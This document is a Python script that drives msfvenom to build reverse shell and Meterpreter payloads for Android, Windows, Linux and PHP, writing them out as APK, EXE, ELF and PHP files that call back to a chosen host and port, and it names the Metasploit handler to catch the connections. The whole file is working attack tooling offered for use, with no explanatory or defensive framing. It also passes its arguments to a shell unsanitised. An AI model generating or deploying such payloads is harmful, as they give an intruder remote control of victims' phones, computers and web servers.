import argparse
import subprocess
import sys

# Parse command-line arguments
parser = argparse.ArgumentParser(description="Generate reverse shell payloads for different operating systems.")
parser.add_argument("-s", "--system", dest='systemOS', help="Operating system (android, windows, linux, php)", required=True)
parser.add_argument("-ip", "--ip", dest='LHOST', default="127.0.0.1", help="LHOST (default: 127.0.0.1)", required=True)
parser.add_argument("-p", "--port", dest='LPORT', help="LPORT (required)", required=True)
options = parser.parse_args()

system = options.systemOS
HOST = options.LHOST
PORT = options.LPORT

# Validate system argument
valid_systems = ['android', 'windows', 'linux', 'php']
if system.lower() not in valid_systems:
    print(f"Error: Unsupported system '{system}'. Supported systems are: {', '.join(valid_systems)}")
    sys.exit(1)

# Function to run msfvenom command and handle errors
def generate_payload(payload_command):
    try:
        subprocess.check_call(payload_command, shell=True)
    except subprocess.CalledProcessError as e:
        print(f"Error during payload generation: {e}")
        sys.exit(1)

# Print info for the user
print(f"-> Generating payload for {system} on LHOST={HOST}, LPORT={PORT}")

if system.lower() == "android":
    print("-> MSF payload: android/meterpreter/reverse_tcp")
    print("-> MSF exploit: [use exploit/multi/handler]")
    generate_payload(f"msfvenom -p android/meterpreter/reverse_tcp LHOST={HOST} LPORT={PORT} R > android_{PORT}.apk")

elif system.lower() == "windows":
    print("-> MSF payload: windows/shell/reverse_tcp")
    print("-> MSF exploit: [use exploit/multi/handler]")
    generate_payload(f"msfvenom -p windows/shell/reverse_tcp LHOST={HOST} LPORT={PORT} -f exe > windows_{PORT}.exe")

elif system.lower() == "linux":
    print("-> MSF payload: linux/x64/shell_reverse_tcp")
    print("-> MSF exploit: [use exploit/multi/handler]")
    generate_payload(f"msfvenom -p linux/x64/shell_reverse_tcp LHOST={HOST} LPORT={PORT} -f elf > linux64_{PORT}.elf")

    print("-> MSF payload: linux/x86/meterpreter/reverse_tcp")
    print("-> MSF exploit: [use exploit/multi/handler]")
    generate_payload(f"msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={HOST} LPORT={PORT} -f elf > linux86_{PORT}.elf")

elif system.lower() == "php":
    print("-> MSF payload: php/meterpreter_reverse_tcp")
    print("-> MSF exploit: [use exploit/multi/handler]")
    generate_payload(f"msfvenom -p php/meterpreter_reverse_tcp LHOST={HOST} LPORT={PORT} -f raw > php_{PORT}.php")

print("-> Payload generation completed.")